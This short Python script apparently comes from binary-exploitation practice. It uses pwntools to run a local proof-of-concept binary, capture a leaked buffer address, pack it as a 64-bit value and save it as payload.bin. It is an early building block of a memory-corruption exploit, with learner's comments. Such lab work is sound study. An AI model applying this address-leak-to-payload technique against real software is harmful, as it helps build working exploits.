# solve64.py

from pwn import *

p = process('./poc64')

p.recvuntil('&buf : ')

bufAddr = p.recv(14)

print(f'bufAddr : {bufAddr}')

int_bufAddr = int(bufAddr,16)

print(f'int_bufAddr : {int_bufAddr}')

x64_bufAddr = p64(int_bufAddr)

## this makes error, cause p32(int addr) only takes int
# x86_bufAddr = p32(bufAddr)

print(f'x64_bufAddr : {x64_bufAddr}')

with open('payload.bin','wb') as f:
    f.write(x64_bufAddr)

